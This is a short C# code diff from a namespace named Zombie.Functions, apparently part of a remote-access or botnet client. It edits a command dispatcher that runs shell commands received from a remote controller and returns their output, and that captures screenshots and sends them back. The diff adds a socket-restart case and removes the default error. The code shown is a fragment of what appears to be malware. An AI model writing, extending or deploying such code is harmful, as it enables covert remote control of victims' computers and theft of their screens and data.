@@ -16,6 +16,9 @@ namespace Zombie.Functions
         {
             switch (flag)
             {
+                case CommandFlags.DataCorrupted:
+                    Client.RestartSocket();
+                    break;
                 case CommandFlags.RemoteCMD:
                     Client.Send(RemoteCMD.ExecuteCommand(reader.ReadString()));
                     break;
@@ -25,8 +28,6 @@ namespace Zombie.Functions
                 case CommandFlags.Screenshot:
                     Client.Send(Screenshot.Take());
                     break;
-                default:
-                    throw new ArgumentException("No command corresponding to the given value.");
 
             }
         }
